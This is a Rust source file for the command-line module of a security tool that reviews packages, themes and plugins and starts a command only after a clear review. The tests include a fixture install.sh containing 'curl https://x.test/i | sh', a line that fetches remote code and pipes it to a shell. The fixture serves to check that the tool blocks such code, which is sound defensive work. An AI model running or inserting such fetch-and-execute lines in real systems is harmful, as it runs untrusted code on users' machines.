//! Command-line parsing and the top-level commands.

use std::ffi::{OsStr, OsString};
use std::fs::OpenOptions;
use std::io::{self, BufRead, BufReader, Write};
use std::os::unix::process::CommandExt;
use std::path::PathBuf;
use std::process::{Command, ExitCode};

use crate::config::Settings;
use crate::config::model::{AiRequirement, Named, Profile, SourceClass};
use crate::pacman::{self, HookArgs};
use crate::report::{Blocked, Decision, Report};
use crate::review::{self, ReviewContext};
use crate::sandbox;
use crate::scan::{self, ScanConfig};
use crate::tools::OpenCode;

const USAGE: &str = "\
Usage:
  omarchy-guardian scan [--thorough] [--hashes] [--exclude NAME]... [--class CLASS] [--profile PROFILE] <file-or-directory>
  omarchy-guardian guard [--thorough] [--hashes] [--exclude NAME]... [--class CLASS] [--profile PROFILE] <file-or-directory> -- <command> [args...]
  omarchy-guardian sandbox [--hashes] [--profile PROFILE] <directory> -- <command> [args...]
  omarchy-guardian pacman-hook --pacman-pid PID --cwd DIR   (run by the pacman hook)

CLASS: aur, theme, plugin, source (default). PROFILE: standard, strict, local-only.
Exit codes: 0 clear or warned, 1 findings, 2 incomplete review, AI unavailable,
not confirmed, or usage error. guard and sandbox replace these with the
command's own exit code once it starts.";

const USAGE_ERROR: u8 = 2;

#[derive(Debug, PartialEq, Eq)]
struct Target {
    config: ScanConfig,
    show_hashes: bool,
    class: SourceClass,
    profile: Option<Profile>,
}

#[derive(Debug, PartialEq, Eq)]
enum Invocation {
    Scan(Target),
    Guard(Target, Vec<OsString>),
    Sandbox(Target, Vec<OsString>),
    PacmanHook(HookArgs),
}

/// Asks the person at the terminal. Anything but an explicit yes, and any
/// failure to reach a terminal, is a no.
pub trait Confirm {
    fn confirm(&mut self, question: &str) -> bool;
}

pub struct TtyConfirm;

impl Confirm for TtyConfirm {
    fn confirm(&mut self, question: &str) -> bool {
        let Ok(mut tty) = OpenOptions::new().read(true).write(true).open("/dev/tty") else {
            return false;
        };
        if write!(tty, "{question} [y/N] ")
            .and_then(|()| tty.flush())
            .is_err()
        {
            return false;
        }

        let mut answer = String::new();
        if BufReader::new(tty).read_line(&mut answer).is_err() {
            return false;
        }
        matches!(answer.trim(), "y" | "Y" | "yes" | "YES")
    }
}

pub fn run(args: impl Iterator<Item = OsString>) -> ExitCode {
    let args: Vec<OsString> = args.collect();
    let invocation = match parse(&args) {
        Ok(invocation) => invocation,
        Err(message) => {
            eprintln!("omarchy-guardian: {message}\n\n{USAGE}");
            return ExitCode::from(USAGE_ERROR);
        }
    };

    let settings = Settings::load();
    for warning in settings.warnings() {
        eprintln!("omarchy-guardian: {warning}");
    }

    match invocation {
        Invocation::Scan(target) => scan_command(&target, &settings),
        Invocation::Guard(target, command) => guard_command(
            &target,
            &command,
            &settings,
            &OpenCode::UserPath,
            &mut TtyConfirm,
            &mut exec_command,
        ),
        Invocation::Sandbox(target, command) => {
            sandbox_command(&target, &command, &settings, &mut TtyConfirm)
        }
        Invocation::PacmanHook(hook) => pacman_hook_command(&hook, &settings),
    }
}

/// A one-run profile override (`--profile`) applies on top of the loaded
/// settings; without it the loaded settings are used unchanged.
fn settings_for(target: &Target, settings: &Settings) -> Settings {
    match target.profile {
        Some(profile) => settings.clone().with_profile(profile),
        None => settings.clone(),
    }
}

/// Reviews a target, applies confirmation, then prints the report once with
/// the final decision — never a stale pre-confirmation headline.
fn review_and_decide(
    target: &Target,
    settings: &Settings,
    opencode: &OpenCode,
    confirm: Option<&mut dyn Confirm>,
) -> (Report, Decision) {
    let report = review::review_tree(
        &target.config,
        &ReviewContext {
            settings,
            class: target.class,
            opencode,
        },
    );
    let mut decision = report.decide(&|class| settings.policy(class));

    // Confirmation is only meaningful when the class was never sent to the
    // AI provider at all (`ai = off`); it never substitutes for a review.
    let policy = settings.policy(target.class);
    if let Some(confirm) = confirm
        && decision.allows_running()
        && policy.confirm
        && policy.ai == AiRequirement::Off
    {
        eprintln!(
            "Local checks: {} text file(s), no blocking findings.",
            report.text_files_reviewed
        );
        let question = format!(
            "Local checks found nothing blocking in {}. No AI review ran. Run it?",
            report.subject
        );
        if !confirm.confirm(&question) {
            decision = Decision::Blocked(Blocked::NotConfirmed);
        }
    }

    report.print(target.show_hashes, decision);
    (report, decision)
}

fn scan_command(target: &Target, settings: &Settings) -> ExitCode {
    let settings = settings_for(target, settings);
    review_and_decide(target, &settings, &OpenCode::UserPath, None)
        .1
        .exit_code()
}

/// Reviews the target and hands `command` to `launch` only after a clear or
/// warned review, an approved confirmation and an unchanged re-hash of the
/// tree.
fn guard_command(
    target: &Target,
    command: &[OsString],
    settings: &Settings,
    opencode: &OpenCode,
    confirm: &mut dyn Confirm,
    launch: &mut dyn FnMut(&[OsString]) -> ExitCode,
) -> ExitCode {
    let settings = settings_for(target, settings);
    let (report, decision) = review_and_decide(target, &settings, opencode, Some(confirm));

    if !decision.allows_running() {
        if decision == Decision::Blocked(Blocked::NotConfirmed) {
            eprintln!("Guardian did not start the command: not confirmed.");
        } else {
            eprintln!("Guardian blocked the command because the review did not allow it.");
        }
        return decision.exit_code();
    }
    if let Err(error) = scan::verify_unchanged(&target.config, &report.snapshot) {
        eprintln!("Guardian blocked the command because {error}.");
        return ExitCode::from(2);
    }

    eprintln!(
        "Guardian: review {}; starting {}",
        if decision == Decision::Warned {
            "passed with warnings"
        } else {
            "clear"
        },
        command.first().map_or_else(String::new, |program| program
            .to_string_lossy()
            .into_owned())
    );
    launch(command)
}

/// Replaces this process with the guarded command, so its exit status and
/// signal behaviour are exactly the command's own.
fn exec_command(command: &[OsString]) -> ExitCode {
    let Some((program, arguments)) = command.split_first() else {
        return ExitCode::from(USAGE_ERROR);
    };
    // Nothing more can be reported if stdout is already gone.
    drop(io::stdout().flush());

    let error = Command::new(program).args(arguments).exec();
    eprintln!(
        "Could not start guarded command {}: {error}",
        program.to_string_lossy()
    );
    ExitCode::from(2)
}

fn sandbox_command(
    target: &Target,
    command: &[OsString],
    settings: &Settings,
    confirm: &mut dyn Confirm,
) -> ExitCode {
    let settings = settings_for(target, settings);
    let (report, decision) =
        review_and_decide(target, &settings, &OpenCode::UserPath, Some(confirm));

    if !decision.allows_running() {
        if decision == Decision::Blocked(Blocked::NotConfirmed) {
            eprintln!("Guardian did not start the sandbox command: not confirmed.");
        } else {
            eprintln!(
                "Guardian did not run the sandbox command because the review did not allow it."
            );
        }
        return decision.exit_code();
    }
    match sandbox::run(&target.config, &report.snapshot, command) {
        Ok(code) => code,
        Err(error) => {
            eprintln!("Guardian blocked the sandbox run because {error}.");
            ExitCode::from(2)
        }
    }
}

fn pacman_hook_command(hook: &HookArgs, settings: &Settings) -> ExitCode {
    match pacman::review_transaction(hook, settings) {
        Ok(report) => {
            let decision = report.decide(&|class| settings.policy(class));
            report.print(false, decision);
            decision.exit_code()
        }
        Err(error) => {
            eprintln!("Guardian blocked the pacman transaction: {error}");
            ExitCode::from(2)
        }
    }
}

#[derive(Clone, Copy)]
struct Allowed {
    thorough: bool,
    exclude: bool,
    class: bool,
}

fn parse(args: &[OsString]) -> Result<Invocation, String> {
    let Some((command, rest)) = args.split_first() else {
        return Err("missing command".into());
    };
    let full = Allowed {
        thorough: true,
        exclude: true,
        class: true,
    };

    match command.to_str() {
        Some("scan") => Ok(Invocation::Scan(parse_target(rest, full)?)),
        Some("guard") => {
            let (options, command) = split_command(rest)?;
            Ok(Invocation::Guard(parse_target(options, full)?, command))
        }
        Some("sandbox") => {
            let (options, command) = split_command(rest)?;
            let mut target = parse_target(
                options,
                Allowed {
                    thorough: false,
                    exclude: false,
                    class: false,
                },
            )?;
            // The sandbox copies everything but `.git`, so everything is reviewed.
            target.config.include_ignored_dirs = true;
            Ok(Invocation::Sandbox(target, command))
        }
        Some("pacman-hook") => parse_hook(rest).map(Invocation::PacmanHook),
        _ => Err(format!("unknown command {:?}", command.to_string_lossy())),
    }
}

fn split_command(args: &[OsString]) -> Result<(&[OsString], Vec<OsString>), String> {
    let separator = args
        .iter()
        .position(|arg| arg == "--")
        .ok_or("missing `--` before the command")?;
    let command = args[separator + 1..].to_vec();
    if command.is_empty() {
        return Err("missing command after `--`".into());
    }
    Ok((&args[..separator], command))
}

fn parse_target(args: &[OsString], allowed: Allowed) -> Result<Target, String> {
    let mut root: Option<PathBuf> = None;
    let mut include_ignored_dirs = false;
    let mut show_hashes = false;
    let mut excluded_top_level = Vec::new();
    let mut class = SourceClass::Source;
    let mut profile = None;
    let mut args = args.iter();

    while let Some(arg) = args.next() {
        match arg.to_str() {
            Some("--hashes") => show_hashes = true,
            Some("--thorough") if allowed.thorough => include_ignored_dirs = true,
            Some("--exclude") if allowed.exclude => {
                let name = args.next().ok_or("--exclude needs a directory name")?;
                excluded_top_level.push(parse_excluded_name(name)?);
            }
            Some("--class") if allowed.class => {
                let name = args
                    .next()
                    .and_then(|name| name.to_str())
                    .unwrap_or_default();
                let parsed = SourceClass::parse(name)
                    .filter(|class| !class.is_privileged())
                    .ok_or_else(|| {
                        format!("--class takes one of: aur, theme, plugin, source (got {name:?})")
                    })?;
                class = parsed;
            }
            Some("--profile") => {
                let name = args
                    .next()
                    .and_then(|name| name.to_str())
                    .unwrap_or_default();
                profile = Some(Profile::parse(name).ok_or_else(|| {
                    format!("--profile takes standard, strict or local-only (got {name:?})")
                })?);
            }
            Some(option) if option.starts_with('-') => {
                return Err(format!(
                    "unknown option {option:?} (prefix a path that starts with `-` with ./)"
                ));
            }
            Some(_) | None if root.is_none() => root = Some(PathBuf::from(arg)),
            Some(_) | None => return Err("more than one path given".into()),
        }
    }

    let mut config = ScanConfig::new(root.ok_or("missing file or directory to review")?);
    config.include_ignored_dirs = include_ignored_dirs;
    config.excluded_top_level = excluded_top_level;
    Ok(Target {
        config,
        show_hashes,
        class,
        profile,
    })
}

fn parse_excluded_name(name: &OsStr) -> Result<String, String> {
    match name.to_str() {
        Some(name) if !name.is_empty() && name != "." && name != ".." && !name.contains('/') => {
            Ok(name.to_string())
        }
        Some(_) | None => Err(format!(
            "--exclude takes one top-level directory name, not {:?}",
            name.to_string_lossy()
        )),
    }
}

fn parse_hook(args: &[OsString]) -> Result<HookArgs, String> {
    let mut pacman_pid = None;
    let mut cwd = None;
    let mut opencode = OpenCode::SystemOnly;
    let mut args = args.iter();

    while let Some(arg) = args.next() {
        match arg.to_str() {
            Some("--pacman-pid") => {
                let value = args.next().and_then(|value| value.to_str());
                pacman_pid = Some(
                    value
                        .and_then(|value| value.parse::<u32>().ok())
                        .ok_or("--pacman-pid needs a process id")?,
                );
            }
            Some("--cwd") => {
                let value = args.next().ok_or("--cwd needs a directory")?;
                let value = PathBuf::from(value);
                if !value.is_absolute() {
                    return Err("--cwd must be an absolute path".into());
                }
                cwd = Some(value);
            }
            Some("--opencode-from-path") => opencode = OpenCode::UserPath,
            Some(_) | None => {
                return Err(format!(
                    "unexpected pacman-hook argument {:?}",
                    arg.to_string_lossy()
                ));
            }
        }
    }

    Ok(HookArgs {
        pacman_pid: pacman_pid.ok_or("missing --pacman-pid")?,
        cwd: cwd.ok_or("missing --cwd")?,
        opencode,
    })
}

#[cfg(test)]
mod tests {
    use std::ffi::OsString;
    use std::fs;
    use std::path::PathBuf;
    use std::process::ExitCode;

    use super::{Confirm, Invocation, Target, guard_command, parse, review_and_decide};
    use crate::config::Settings;
    use crate::config::file::{PartialConfig, PartialPolicy};
    use crate::config::model::{AiRequirement, Profile, SourceClass};
    use crate::report::{Blocked, Decision};
    use crate::scan::ScanConfig;
    use crate::test_support::{TempDir, mock_opencode};
    use crate::tools::OpenCode;

    fn args(values: &[&str]) -> Vec<OsString> {
        values.iter().map(OsString::from).collect()
    }

    fn unavailable() -> OpenCode {
        OpenCode::At(PathBuf::from("/nonexistent/opencode"))
    }

    fn default_settings() -> Settings {
        Settings::from_parts(PartialConfig::default(), PartialConfig::default())
    }

    fn local_only() -> Settings {
        default_settings().with_profile(Profile::LocalOnly)
    }

    struct Scripted(Option<bool>, Vec<String>);

    impl Confirm for Scripted {
        fn confirm(&mut self, question: &str) -> bool {
            self.1.push(question.to_string());
            self.0.unwrap_or(false)
        }
    }

    #[test]
    fn parses_guard_with_exclusions() {
        let parsed = parse(&args(&[
            "guard",
            "--thorough",
            "--exclude",
            "src",
            "--exclude",
            "pkg",
            "/build",
            "--",
            "makepkg",
            "--noconfirm",
        ]))
        .unwrap();

        let Invocation::Guard(target, command) = parsed else {
            panic!("expected guard, got {parsed:?}");
        };
        assert_eq!(target.config.root, PathBuf::from("/build"));
        assert!(target.config.include_ignored_dirs);
        assert_eq!(target.config.excluded_top_level, ["src", "pkg"]);
        assert_eq!(command, args(&["makepkg", "--noconfirm"]));
    }

    #[test]
    fn rejects_unknown_options_and_bad_exclusions() {
        for bad in [
            &["scan", "--thorogh", "dir"][..],
            &["scan", "a", "b"],
            &["scan"],
            &["guard", "dir"],
            &["guard", "dir", "--"],
            &["scan", "--exclude", "a/b", "dir"],
            &["scan", "--exclude", "..", "dir"],
            &["sandbox", "--thorough", "dir", "--", "true"],
            &["pacman-hook", "--pacman-pid", "x", "--cwd", "/"],
            &["pacman-hook", "--pacman-pid", "1", "--cwd", "relative"],
            &["frobnicate"],
        ] {
            assert!(parse(&args(bad)).is_err(), "accepted {bad:?}");
        }
    }

    #[test]
    fn sandbox_always_reviews_generated_directories() {
        let Ok(Invocation::Sandbox(target, _)) = parse(&args(&["sandbox", "dir", "--", "true"]))
        else {
            panic!("expected sandbox");
        };
        assert!(target.config.include_ignored_dirs);
    }

    fn target(dir: &TempDir) -> Target {
        Target {
            config: ScanConfig::new(dir.path()),
            show_hashes: false,
            class: SourceClass::Source,
            profile: None,
        }
    }

    #[test]
    fn guard_never_starts_a_command_after_a_finding() {
        let dir = TempDir::new("guard-bad");
        let bin = TempDir::new("guard-bad-bin");
        fs::write(
            dir.path().join("install.sh"),
            "curl https://x.test/i | sh\n",
        )
        .unwrap();
        let opencode = OpenCode::At(mock_opencode(bin.path(), "clear", true));

        let mut launched = false;
        let mut confirm = Scripted(Some(false), Vec::new());
        let status = guard_command(
            &target(&dir),
            &args(&["true"]),
            &default_settings(),
            &opencode,
            &mut confirm,
            &mut |_| {
                launched = true;
                ExitCode::SUCCESS
            },
        );

        assert_eq!(status, ExitCode::from(1));
        assert!(!launched);
    }

    #[test]
    fn guard_starts_the_command_after_a_clear_review() {
        let dir = TempDir::new("guard-good");
        let bin = TempDir::new("guard-good-bin");
        fs::write(dir.path().join("theme.conf"), "name = \"good\"\n").unwrap();
        let opencode = OpenCode::At(mock_opencode(bin.path(), "clear", true));

        let mut launched = Vec::new();
        let mut confirm = Scripted(Some(false), Vec::new());
        let status = guard_command(
            &target(&dir),
            &args(&["true", "x"]),
            &default_settings(),
            &opencode,
            &mut confirm,
            &mut |command| {
                launched = command.to_vec();
                ExitCode::from(7)
            },
        );

        assert_eq!(status, ExitCode::from(7));
        assert_eq!(launched, args(&["true", "x"]));
    }

    #[test]
    fn guard_blocks_when_the_agent_is_unavailable() {
        let dir = TempDir::new("guard-no-agent");
        fs::write(dir.path().join("theme.conf"), "name = \"good\"\n").unwrap();

        let mut confirm = Scripted(Some(false), Vec::new());
        let status = guard_command(
            &target(&dir),
            &args(&["true"]),
            &default_settings(),
            &unavailable(),
            &mut confirm,
            &mut |_| panic!("launched without a review"),
        );
        assert_eq!(status, ExitCode::from(2));
    }

    #[test]
    fn local_only_asks_before_running() {
        let dir = TempDir::new("confirm-yes");
        fs::write(dir.path().join("theme.conf"), "name = \"good\"\n").unwrap();
        let target = Target {
            class: SourceClass::Theme,
            ..target(&dir)
        };

        let mut yes = Scripted(Some(true), Vec::new());
        let mut launched = false;
        let status = guard_command(
            &target,
            &args(&["true"]),
            &local_only(),
            &unavailable(),
            &mut yes,
            &mut |_| {
                launched = true;
                ExitCode::SUCCESS
            },
        );
        assert!(launched);
        assert_eq!(status, ExitCode::SUCCESS);
        assert_eq!(yes.1.len(), 1);
    }

    #[test]
    fn confirmation_without_a_terminal_blocks() {
        let dir = TempDir::new("confirm-none");
        fs::write(dir.path().join("theme.conf"), "name = \"good\"\n").unwrap();
        let target = Target {
            class: SourceClass::Theme,
            ..target(&dir)
        };

        let mut no_terminal = Scripted(None, Vec::new());
        let status = guard_command(
            &target,
            &args(&["true"]),
            &local_only(),
            &unavailable(),
            &mut no_terminal,
            &mut |_| panic!("launched without confirmation"),
        );
        assert_eq!(status, ExitCode::from(2));
    }

    #[test]
    fn class_and_profile_flags_parse() {
        let Ok(Invocation::Scan(target)) = parse(&args(&[
            "scan",
            "--class",
            "aur",
            "--profile",
            "strict",
            "dir",
        ])) else {
            panic!("expected scan");
        };
        assert_eq!(target.class, SourceClass::Aur);
        assert_eq!(target.profile, Some(Profile::Strict));

        for bad in [
            &["scan", "--class", "official", "dir"][..],
            &["scan", "--class", "nope", "dir"],
            &["scan", "--profile", "paranoid", "dir"],
        ] {
            assert!(parse(&args(bad)).is_err(), "accepted {bad:?}");
        }
    }

    #[test]
    fn guard_under_local_only_with_a_declined_confirm_is_not_confirmed() {
        let dir = TempDir::new("confirm-declined");
        fs::write(dir.path().join("theme.conf"), "name = \"good\"\n").unwrap();
        let target = Target {
            class: SourceClass::Theme,
            ..target(&dir)
        };
        let settings = local_only();

        let mut declined = Scripted(Some(false), Vec::new());
        let (_, decision) =
            review_and_decide(&target, &settings, &unavailable(), Some(&mut declined));
        assert_eq!(decision, Decision::Blocked(Blocked::NotConfirmed));

        let mut declined = Scripted(Some(false), Vec::new());
        let status = guard_command(
            &target,
            &args(&["true"]),
            &settings,
            &unavailable(),
            &mut declined,
            &mut |_| panic!("launched without confirmation"),
        );
        assert_eq!(status, ExitCode::from(2));
    }

    #[test]
    fn confirm_is_ignored_unless_ai_is_off() {
        let dir = TempDir::new("confirm-ai-required");
        let bin = TempDir::new("confirm-ai-required-bin");
        fs::write(dir.path().join("theme.conf"), "name = \"good\"\n").unwrap();
        let target = Target {
            class: SourceClass::Theme,
            ..target(&dir)
        };
        // Standard profile leaves ai = required for a non-official class; a
        // user file may still set confirm = true, but it must not be asked.
        let user = PartialConfig {
            classes: vec![(
                SourceClass::Theme,
                PartialPolicy {
                    confirm: Some(true),
                    ..PartialPolicy::default()
                },
            )],
            ..PartialConfig::default()
        };
        let settings = Settings::from_parts(PartialConfig::default(), user);
        assert_eq!(
            settings.policy(SourceClass::Theme).ai,
            AiRequirement::Required
        );
        assert!(settings.policy(SourceClass::Theme).confirm);

        let opencode = OpenCode::At(mock_opencode(bin.path(), "clear", true));
        let mut confirm = Scripted(Some(true), Vec::new());
        let (_, decision) = review_and_decide(&target, &settings, &opencode, Some(&mut confirm));

        assert_eq!(decision, Decision::Clear);
        assert!(confirm.1.is_empty());
    }
}
